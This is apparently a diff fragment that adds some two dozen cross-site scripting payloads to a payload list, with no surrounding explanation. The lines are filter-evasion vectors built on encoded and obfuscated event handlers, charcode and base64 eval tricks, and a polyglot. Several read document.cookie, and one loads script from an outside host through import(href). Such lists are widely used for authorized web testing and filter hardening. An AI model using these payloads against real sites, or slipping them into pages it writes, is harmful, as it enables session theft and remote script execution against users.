@@ -47,3 +47,29 @@ svg onload=alert&#0000000040document.cookie)>
 <details open ontoggle​=content['al'%2B'ert'](1) >
 <svg onload=alert&#0000000040document.cookie)>
 a href=javas&Tab;cript​:ale&Tab;rt()>clickme</a>
+onxss=><svg/ONLoad​=alert(cookie)+x
+ONxss=><details open ontoggle​=prompt(document.domain)+x
+<h2></div></div><​script>alert(1)<​/script>
+<iframe on only=1 onload​="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\144\157\143\165\155\145\156\164\56\144\157\155\141\151\156\51')()">
+<iframe on only=1 onload​="[][ 'filter' ][ 'constructor' ]( 'alert(document.domain)' )()">
+<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
+<A HRef=//sysbraykr.com AutoFocus %26%2362 OnFocus%0C=import(href)>
+%3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
+<Svg On Only=1 Onload=alert(1)>
+<IFRAME SRC="javascript:alert(document.cookie);"></IFRAME>
+<Img Src=OnXSS OnError​=confirm(document.cookie)>
+"><svg%20onload=alert%26%230000000040"1")>
+<svg/onload​=alert/*1337*/(1)>
+<svg/onload​=alert//&NewLine;(2)>
+<svg/onload​=alert&sol;**&sol;(3)>
+<svg/onload​=alert/&#42;&#42;/(4)>
+<svg/onload​=alert&#x2F;**&#47;(5)>
+<div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
+%2sscript%2ualert()%2s/script%2u
+<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+<img/src/onerror=alert&#xFEFF;(1337)>
+["');alert('XSS');//"]
+"><Svg Only=1 OnLoad​=confirm(atob("Q2xvdWRmbGFyZSBYU1Mg"))>
+"><track/onerror='confirm`1`'>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
